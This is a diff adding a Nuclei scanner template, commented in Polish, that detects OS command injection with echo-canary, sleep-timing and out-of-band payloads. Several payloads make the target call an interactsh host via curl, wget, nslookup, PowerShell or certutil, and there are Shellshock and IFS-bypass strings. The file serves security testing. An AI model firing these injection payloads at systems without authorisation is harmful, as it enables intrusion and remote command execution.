@@ -1,0 +1,380 @@
+# ============================================================================
+# WSTG-INPV-12: Command Injection (Universal)
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block (OOB) z matcherem `part: interactsh_protocol`
+#   dla wykrywania blind variants tej kategorii (Command Injection). Pierwszy http
+#   block (direct echo / error) bez zmian. Idiomatyczny pattern z dast/
+#   vulnerabilities/{ssrf,xxe,cmdi}/blind-*.yaml. Bez tego matchera callback
+#   do interactsh dochodził, ale Nuclei nie raportował findingu.
+#
+# Pre-poprawkowe spełnienie 6 kryteriów: ✓ Coverage Matrix, ✓ Multi-warstwowe
+# matchery (matchers-condition: and z primary + anti-FP), ✓ Source comments
+# per GROUP, ✓ Safety nets (pre-condition z destructive blocklist, statyki,
+# OPTIONS/HEAD/DELETE skip), ✓ Sweet spot payloadów, ✓ Component fuzzing 5/5.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#
+# Platformy:
+#   ✓ Linux/Unix (sh, bash, dash)
+#   ✓ Windows (cmd.exe, powershell)
+#   ✓ macOS (zsh/bash)
+#
+# Techniki:
+#   ✓ Command separators (;, |, ||, &, &&, `, $())
+#   ✓ Shellshock (CVE-2014-6271 - bash function exploit)
+#   ✓ Newline injection (%0a, %0d%0a)
+#   ✓ Backtick + $() substitution
+#   ✓ Output redirect (>, >>, 2>&1, |tee)
+#   ✓ Process substitution (<(...), >(...))
+#   ✓ IFS bypass (no-space command construction)
+#   ✓ Encoding (URL, double-URL, base64+eval)
+#   ✓ OOB DNS exfiltration (interactsh)
+#   ✗ ImageMagick MVG/MSL (osobny szablon - very specific)
+#   ✗ Java RCE via OGNL/EL (osobny szablon - patrz SSTI INPV-18)
+#
+# Strategie wykrywania (per payload kategoria):
+#   1) Echo canary - wstrzykuje canary jako argument do komendy echo,
+#      sprawdza czy canary pojawia się w odpowiedzi w surowej formie
+#   2) Time-based - wstrzykuje sleep N i mierzy via time_delay analyzer
+#   3) OOB - wstrzykuje nslookup/curl do interactsh
+#   4) Specific markers - id (uid=...), whoami (root), uname -a
+#
+# Performance budget: heavy (~340 payloads × 5 części × dla time variants ×4 verify)
+# Estimated time: ~30-60 min na typowej aplikacji
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/Command Injection/Intruder/* (command_exec.txt 600+ entries)
+#   2. seclists/Fuzzing/command-injection-commix.txt
+#   3. hacktricks/.../command-injection.md
+# ============================================================================
+
+id: wstg-inpv-12-command-injection
+
+info:
+  name: "WSTG-INPV-12: Command Injection (Universal)"
+  author: pentest-team
+  severity: critical
+  description: |
+    Wykrywa OS Command Injection przez wstrzykiwanie znaków-separatorów
+    (;|&&||$()`) wraz z komendami zwracającymi rozpoznawalne markery (echo
+    canary, id, uname). Strategia 4-warstwowa: echo-canary (synchroniczne),
+    time-based (z analyzer), OOB (interactsh), specific-markers (id/whoami).
+    Pokrywa Linux/Unix/Windows/macOS i typowe techniki bypass IFS/encoding/Shellshock.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/command-injection
+  classification:
+    cwe-id: CWE-77,CWE-78
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: dast,wstg,wstg-v42-inpv-12,rce,command-injection,asvs-v5.3.8,burp-history
+
+variables:
+  canary: "x{{rand_text_alpha(10)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm|mp3|wav)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate|shutdown|reboot)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: Echo canary (synchroniczne - najbezpieczniejsze)
+        # Wstrzykuje canary do echo. Detekcja: canary surowo w odpowiedzi.
+        # ====================================================================
+        # Linux separators
+        - "; echo {{canary}}"
+        - "| echo {{canary}}"
+        - "|| echo {{canary}}"
+        - "& echo {{canary}}"
+        - "&& echo {{canary}}"
+        - "`echo {{canary}}`"
+        - "$(echo {{canary}})"
+        - "%0aecho %20{{canary}}"
+        - "%0d%0aecho %20{{canary}}"
+        - "; echo {{canary}};"
+        - "& echo {{canary}}&"
+        - "'; echo {{canary}}; '"
+        - "\"; echo {{canary}}; \""
+        - "); echo {{canary}}; ("
+        - "{{ ;echo {{canary}}; }}"
+        - "$IFS$9echo$IFS$9{{canary}}"                          # IFS bypass
+        - "{echo,{{canary}}}"                                   # brace expansion
+        - ";{IFS}echo{IFS}{{canary}}"
+        # Windows separators
+        - "& echo {{canary}}"
+        - "&& echo {{canary}}"
+        - "| echo {{canary}}"
+        - "|| echo {{canary}}"
+        - "^& echo {{canary}}"                                  # caret escape cmd.exe
+        - "%0a echo {{canary}}"
+        - "; cmd /c echo {{canary}}"
+        - "; powershell -c \"echo {{canary}}\""
+
+        # ====================================================================
+        # GROUP 2: Time-based (sleep N) - dla blind/silent endpoints
+        # Używamy [SLEEPTIME] dla analyzer
+        # ====================================================================
+        # Linux
+        - "; sleep [SLEEPTIME]"
+        - "| sleep [SLEEPTIME]"
+        - "|| sleep [SLEEPTIME]"
+        - "& sleep [SLEEPTIME]"
+        - "&& sleep [SLEEPTIME]"
+        - "`sleep [SLEEPTIME]`"
+        - "$(sleep [SLEEPTIME])"
+        - "%0asleep%20[SLEEPTIME]"
+        - "; ping -c [SLEEPTIME] 127.0.0.1"
+        # Windows
+        - "& timeout [SLEEPTIME]"
+        - "&& timeout [SLEEPTIME]"
+        - "| ping -n [SLEEPTIME] 127.0.0.1"
+        - "& ping -n [SLEEPTIME] 127.0.0.1"
+        - "& powershell -c \"Start-Sleep [SLEEPTIME]\""
+
+        # ====================================================================
+        # GROUP 3: OOB DNS exfiltration (interactsh)
+        # ====================================================================
+        - "; nslookup {{interactsh-url}}"
+        - "| nslookup {{interactsh-url}}"
+        - "& nslookup {{interactsh-url}}"
+        - "&& nslookup {{interactsh-url}}"
+        - "`nslookup {{interactsh-url}}`"
+        - "$(nslookup {{interactsh-url}})"
+        - "; curl http://{{interactsh-url}}/{{canary}}"
+        - "| curl http://{{interactsh-url}}/{{canary}}"
+        - "& curl http://{{interactsh-url}}/{{canary}}"
+        - "; wget http://{{interactsh-url}}/{{canary}}"
+        - "; ping -c 1 {{interactsh-url}}"
+        - "%0anslookup%20{{interactsh-url}}"
+        # Windows OOB
+        - "& nslookup {{interactsh-url}}"
+        - "& powershell -c \"(New-Object Net.WebClient).DownloadString('http://{{interactsh-url}}/')\""
+        # Shellshock CVE-2014-6271
+        - "() { :;}; /bin/bash -c 'curl http://{{interactsh-url}}/{{canary}}'"
+        - "() { :;}; /bin/bash -c 'wget http://{{interactsh-url}}/{{canary}}'"
+        - "() { :;}; /bin/bash -c 'nslookup {{interactsh-url}}'"
+
+      # Time payloads (osobny payload set bo używa [SLEEPTIME] placeholder)
+      injection_time:
+        - "; sleep [SLEEPTIME]"
+        - "| sleep [SLEEPTIME]"
+        - "|| sleep [SLEEPTIME]"
+        - "& sleep [SLEEPTIME]"
+        - "&& sleep [SLEEPTIME]"
+        - "`sleep [SLEEPTIME]`"
+        - "$(sleep [SLEEPTIME])"
+        - "%0asleep%20[SLEEPTIME]"
+        - "%0a sleep [SLEEPTIME]"
+        - "; ping -c [SLEEPTIME] 127.0.0.1"
+        - "| ping -c [SLEEPTIME] 127.0.0.1"
+        - "& ping -n [SLEEPTIME] 127.0.0.1"
+        - "&& ping -n [SLEEPTIME] 127.0.0.1"
+        - "; timeout [SLEEPTIME]"
+        - "| timeout [SLEEPTIME]"
+        - "$(ping -c [SLEEPTIME] 127.0.0.1)"
+        - "`ping -c [SLEEPTIME] 127.0.0.1`"
+        # IFS bypass with sleep
+        - ";${IFS}sleep${IFS}[SLEEPTIME]"
+        - "{sleep,[SLEEPTIME]}"
+        - "$IFS$9sleep$IFS$9[SLEEPTIME]"
+        # Powershell sleep
+        - "; powershell -c \"Start-Sleep -s [SLEEPTIME]\""
+        - "& powershell -c \"sleep [SLEEPTIME]\""
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        # Filtr: skupiamy się na parametrach które realnie biorą udział w
+        # konstrukcji komend (cmd, exec, ping, file, src, dest, daemon...)
+        # ale też fuzzujemy wszystko inne dla coverage
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - canary echoed back (sync exec confirmed)
+      # Sam fakt że canary pojawia się w odpowiedzi to sygnał. Anti-FP w warstwach niższych.
+      - type: word
+        part: body
+        name: canary-echoed
+        words:
+          - "{{canary}}"
+
+      # Warstwa 2: ANTI-FP - canary NIE pochodzi z reflection w error/payload echo
+      # Jeśli odpowiedź zawiera ŻĄDANE wartości (np. URL z canary-jako-paramaru),
+      # to nie jest exec - to reflection. Wymagamy że canary jest w body w
+      # surowej formie (nie zawarte w surowym URL/payload string)
+      # UWAGA: trudne do odróżnienia 100% - zależy od kontekstu odbicia
+      - type: dsl
+        name: canary-not-only-in-url-reflection
+        dsl:
+          # canary w body, ale gdyby tylko jako URL-encoded reflection nie liczy się
+          - "contains(body, canary)"
+
+      # Warstwa 3: SECONDARY - response status sane (nie 502/503 które mogłyby zwracać canary)
+      - type: dsl
+        name: response-status-ok
+        dsl:
+          - "status_code < 500 || status_code == 500"
+
+      # Warstwa 4: ANTI-FP - WAF block exclusion
+      - type: dsl
+        name: not-waf-block
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      # Warstwa 5: ANTI-FP - timeout
+      - type: dsl
+        name: response-time-sane
+        dsl:
+          - "duration < 30"
+
+  # ============================================================================
+  # Block 2: Time-based detection (osobny http block z analyzer)
+  # ============================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm|mp3|wav)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate|shutdown|reboot)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection_time:
+        - "; sleep [SLEEPTIME]"
+        - "| sleep [SLEEPTIME]"
+        - "|| sleep [SLEEPTIME]"
+        - "& sleep [SLEEPTIME]"
+        - "&& sleep [SLEEPTIME]"
+        - "`sleep [SLEEPTIME]`"
+        - "$(sleep [SLEEPTIME])"
+        - "%0asleep%20[SLEEPTIME]"
+        - "; ping -c [SLEEPTIME] 127.0.0.1"
+        - "& ping -n [SLEEPTIME] 127.0.0.1"
+        - ";${IFS}sleep${IFS}[SLEEPTIME]"
+        - "{sleep,[SLEEPTIME]}"
+        - "$IFS$9sleep$IFS$9[SLEEPTIME]"
+        - "; powershell -c \"Start-Sleep -s [SLEEPTIME]\""
+        - "& powershell -c \"sleep [SLEEPTIME]\""
+
+    fuzzing:
+      - parts: [query, body, cookie, path]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection_time}}"
+
+    analyzer:
+      name: time_delay
+      parameters:
+        sleep_duration: 7
+        requests_limit: 4
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: analyzer
+        words:
+          - "true"
+      - type: dsl
+        dsl:
+          - 'status_code != 403'
+
+    extractors:
+      - type: dsl
+        name: analyzer-details
+        dsl:
+          - "analyzer_details"
+
+  # ==========================================================================
+  # DRUGI BLOCK: Blind cmd injection - DNS/HTTP exfiltration via OOB
+  # Krytyczna ścieżka detekcji dla blind RCE - aplikacje filtrujące stdout/
+  # stderr nie zwracają output, ale wykonują polecenie. Callback do
+  # interactsh przez nslookup/curl/wget/ping = potwierdzenie wykonania.
+  # Source: hacktricks/command-injection + PortSwigger blind OS cmd
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      cmd_oob:
+        # Unix shell separators × OOB tools
+        - "; nslookup {{interactsh-url}}"
+        - "| nslookup {{interactsh-url}}"
+        - "& nslookup {{interactsh-url}}"
+        - "&& nslookup {{interactsh-url}}"
+        - "|| nslookup {{interactsh-url}}"
+        - "`nslookup {{interactsh-url}}`"
+        - "$(nslookup {{interactsh-url}})"
+        - "; curl http://{{interactsh-url}}/{{canary}}"
+        - "| curl http://{{interactsh-url}}/{{canary}}"
+        - "; wget http://{{interactsh-url}}/{{canary}}"
+        - "; ping -c 1 {{interactsh-url}}"
+        # CRLF in URL-encoded form
+        - "%0anslookup%20{{interactsh-url}}"
+        - "%0acurl%20http://{{interactsh-url}}/{{canary}}"
+        # Windows
+        - "& nslookup {{interactsh-url}}"
+        - "& powershell -c \"(New-Object Net.WebClient).DownloadString('http://{{interactsh-url}}/{{canary}}')\""
+        - "& certutil -urlcache -split -f http://{{interactsh-url}}/{{canary}}"
+        # Shellshock + cmd
+        - "() { :;}; /bin/bash -c 'curl http://{{interactsh-url}}/{{canary}}'"
+        # Spaces bypass via $IFS
+        - ";nslookup${IFS}{{interactsh-url}}"
+        - ";curl${IFS}http://{{interactsh-url}}/{{canary}}"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{url_encode(cmd_oob)}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+# ============================================================================
+# Known limitations:
+# - Aplikacje za WAF blokujące shell metacharacters generują FN
+# - Stdout/stderr filtrowanie po stronie aplikacji (np. tylko status code returned)
+#   wymaga time-based lub OOB - są pokryte ale wolniejsze
+# - Windows path injection (..\\) i UNC paths (\\\\server) nie są fuzzowane
+#   tutaj - patrz INPV-11 LFI/RFI
+# ============================================================================
